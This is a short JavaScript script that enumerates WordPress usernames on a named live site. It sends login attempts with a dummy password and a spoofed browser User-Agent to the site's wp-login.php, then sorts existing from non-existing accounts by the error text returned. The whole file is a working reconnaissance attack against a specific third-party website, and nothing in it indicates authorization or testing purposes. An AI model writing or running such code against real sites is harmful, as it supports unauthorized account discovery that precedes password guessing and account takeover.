const WP_URL = "https://nufca.com";

const usernamesToTest = [
    "$#@SHyami9413",
    "SHyami9413",
    "shyami9413",
    "SHyami",
    "shyami"
];

async function testWpLogin(username) {
    console.log(`Testing wp-login.php for username candidate: "${username}"...`);
    
    // We send dummy request to wp-login.php to check error message returned by WordPress
    const body = new URLSearchParams({
        'log': username,
        'pwd': 'dummy_password_for_check_123',
        'wp-submit': 'Log In',
        'redirect_to': `${WP_URL}/wp-admin/`,
        'testcookie': '1'
    });

    try {
        const res = await fetch(`${WP_URL}/wp-login.php`, {
            method: 'POST',
            body: body.toString(),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        });

        const html = await res.text();
        if (html.includes("Unknown username") || html.includes("Invalid username")) {
            console.log(`❌ Username "${username}" DOES NOT EXIST on this WordPress site.`);
        } else if (html.includes("The password you entered for the username") || html.includes("incorrect")) {
            console.log(`✅ Username "${username}" EXISTS on this WordPress site! (Password was wrong for form login, as expected)`);
            return username;
        } else {
            console.log(`Response for "${username}": HTML length ${html.length}`);
        }
    } catch (e) {
        console.log(`Error testing wp-login for "${username}":`, e.message);
    }
    return null;
}

async function run() {
    for (const u of usernamesToTest) {
        const found = await testWpLogin(u);
        if (found) {
            console.log(`\n🎯 VALID WORDPRESS USERNAME IDENTIFIED: "${found}"`);
        }
    }
}

run();
